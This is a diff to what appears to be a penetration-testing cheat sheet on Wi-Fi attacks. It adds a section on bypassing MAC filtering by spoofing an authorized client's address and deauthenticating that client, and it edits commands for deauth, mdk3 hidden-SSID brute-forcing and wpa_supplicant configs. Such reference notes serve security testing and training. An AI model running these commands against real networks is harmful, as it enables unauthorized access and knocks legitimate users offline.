@@ -122,7 +122,7 @@ airodump-ng $interface -c $channel --bssid $bssid -w capture
 aireplay-ng -0 2 -a $bssid -c $client_mac $interface
 ```
 
-#### Brute-force SSID:
+#### Brute-force SSID
 
 ```bash
 # Full brute-force (short SSIDs only)
@@ -132,6 +132,25 @@ mdk3 $interface p -b u -c 1 -t $bssid
 mdk3 $interface p -f /opt/wordlist.txt -t $bssid
 
 # Character sets: u (uppercase), n (digits), a (all), c (mixed case), m (mixed+numbers)
+```
+
+## MAC Filtering Bypass
+
+1. Identify an authorized client MAC from airodump-ng (`STATION` column)
+2. Spoof your MAC
+
+```bash
+# show current mac addr
+macchanger $interface
+
+# (Interface must be down)
+macchanger -m $authorized_mac $interface
+```
+
+3. Deauth the legitimate client
+
+```bash
+aireplay-ng -0 1 -a $bssid -c $authorized_mac $interface
 ```
 
 ## Aircrack-ng Suite
@@ -174,7 +193,7 @@ network={
 ```bash
 network={
     ssid="SSID"
-    psk="password"
+    psk="$password"
 }
 ```
 
@@ -194,6 +213,6 @@ network={
 :::
 
 ```bash
-wpa_supplicant -i $interface -c conf
+wpa_supplicant -i $interface -c file.conf
 sudo dhclient $interface
 ```
